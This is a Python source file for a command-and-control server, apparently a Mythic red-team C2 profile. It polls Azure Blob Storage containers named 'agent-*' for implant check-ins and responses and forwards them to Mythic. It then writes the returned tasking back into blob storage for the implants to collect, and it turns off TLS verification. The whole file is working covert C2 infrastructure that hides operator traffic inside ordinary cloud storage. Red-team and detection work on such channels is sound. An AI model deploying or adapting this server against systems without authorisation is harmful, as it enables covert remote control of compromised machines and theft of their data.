#!/usr/bin/env python3
"""
Azure Blob Storage C2 Server - Polling Loop

Polls Azure Blob Storage for agent messages and forwards them to Mythic.
Uses account key to access all agent containers (agent-* prefix).
"""

import asyncio
import json
import os
import sys
from pathlib import Path

import aiohttp
from azure.storage.blob import BlobServiceClient
from azure.core.exceptions import ResourceNotFoundError


class AzureBlobServer:
    def __init__(self):
        self.storage_account = ""
        self.account_key = ""
        self.mythic_address = os.environ.get("MYTHIC_ADDRESS", "http://mythic_server:17443")
        self.poll_interval = 5
        self.blob_service = None
        self.known_containers = set()

    def load_config(self):
        """Load configuration from config.json and environment"""
        config_path = Path(__file__).parent / "config.json"
        if config_path.exists():
            with open(config_path) as f:
                config = json.load(f)
                self.storage_account = config.get("storage_account", "")
                self.account_key = config.get("account_key", "")
                self.poll_interval = int(config.get("poll_interval", 5))

        # Environment overrides
        self.storage_account = os.environ.get("STORAGE_ACCOUNT", self.storage_account)
        self.account_key = os.environ.get("ACCOUNT_KEY", self.account_key)
        self.mythic_address = os.environ.get("MYTHIC_ADDRESS", self.mythic_address)

        if not self.storage_account or not self.account_key:
            print("[-] Missing storage_account or account_key configuration")
            sys.exit(1)

        connection_string = (
            f"DefaultEndpointsProtocol=https;"
            f"AccountName={self.storage_account};"
            f"AccountKey={self.account_key};"
            f"EndpointSuffix=core.windows.net"
        )
        self.blob_service = BlobServiceClient.from_connection_string(connection_string)

    async def forward_to_mythic(self, message: bytes) -> bytes:
        """Forward message to Mythic and return response"""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(
                    f"{self.mythic_address}",
                    data=message,
                    headers={
                        "Content-Type": "application/octet-stream",
                        "Mythic": "azure_blob",
                    },
                    ssl=False,
                ) as resp:
                    return await resp.read()
            except Exception as e:
                print(f"[-] Error forwarding to Mythic: {e}")
                return b""

    async def process_checkin(self, container_name: str):
        """Process initial agent checkin"""
        container_client = self.blob_service.get_container_client(container_name)

        try:
            blob_client = container_client.get_blob_client("checkin.blob")
            data = blob_client.download_blob().readall()

            # Forward to Mythic
            response = await self.forward_to_mythic(data)

            if response:
                # Write response as initial tasking
                tasking_blob = container_client.get_blob_client("tasking/pending.blob")
                tasking_blob.upload_blob(response, overwrite=True)

                # Delete checkin blob (processed)
                blob_client.delete_blob()

                print(f"[+] Processed checkin from {container_name}")

        except ResourceNotFoundError:
            pass  # No checkin blob, that's fine
        except Exception as e:
            print(f"[-] Error processing checkin for {container_name}: {e}")

    async def process_responses(self, container_name: str):
        """Process agent responses"""
        container_client = self.blob_service.get_container_client(container_name)

        try:
            # List response blobs
            blobs = list(container_client.list_blobs(name_starts_with="response/"))

            for blob in blobs:
                try:
                    blob_client = container_client.get_blob_client(blob.name)
                    data = blob_client.download_blob().readall()

                    # Forward to Mythic
                    response = await self.forward_to_mythic(data)

                    if response:
                        # Update tasking
                        tasking_blob = container_client.get_blob_client("tasking/pending.blob")
                        tasking_blob.upload_blob(response, overwrite=True)

                    # Delete processed response
                    blob_client.delete_blob()

                    print(f"[+] Processed response from {container_name}: {blob.name}")

                except Exception as e:
                    print(f"[-] Error processing response {blob.name}: {e}")

        except Exception as e:
            print(f"[-] Error listing responses for {container_name}: {e}")

    async def poll_loop(self):
        """Main polling loop"""
        print("[*] Azure Blob Storage C2 Server started")
        print(f"[*] Storage Account: {self.storage_account}")
        print(f"[*] Mythic Address: {self.mythic_address}")
        print(f"[*] Poll Interval: {self.poll_interval}s")
        sys.stdout.flush()

        while True:
            try:
                # Discover agent containers
                containers = self.blob_service.list_containers(name_starts_with="agent-")

                for container in containers:
                    container_name = container.name

                    if container_name not in self.known_containers:
                        print(f"[+] Discovered new agent container: {container_name}")
                        self.known_containers.add(container_name)

                    # Process checkins
                    await self.process_checkin(container_name)

                    # Process responses
                    await self.process_responses(container_name)

            except Exception as e:
                print(f"[-] Polling error: {e}")

            sys.stdout.flush()
            await asyncio.sleep(self.poll_interval)

    def run(self):
        """Entry point"""
        self.load_config()
        asyncio.run(self.poll_loop())


if __name__ == "__main__":
    server = AzureBlobServer()
    server.run()
